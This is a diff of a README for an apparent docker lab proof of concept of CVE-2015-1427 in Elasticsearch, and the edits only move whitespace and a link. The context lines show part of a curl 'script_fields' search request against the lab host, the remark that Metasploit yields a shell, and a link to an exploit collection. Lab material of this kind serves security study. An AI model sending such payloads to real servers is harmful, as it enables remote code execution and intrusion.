@@ -2,7 +2,6 @@
 
 PoC rely on *CVE-2015-1427* exploitation https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1427
 
-
 ## Pre-requisites
 - docker
 - docker-compose
@@ -70,8 +69,8 @@ curl -XPOST 'http://elhackstic_vulnerable_1:9200/_search?pretty' -d '{"script_fi
 ```
 
 Finally you easily can get a shell with metasploit.
-or try https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch
 
+or try https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch
 
 #### Sources
 
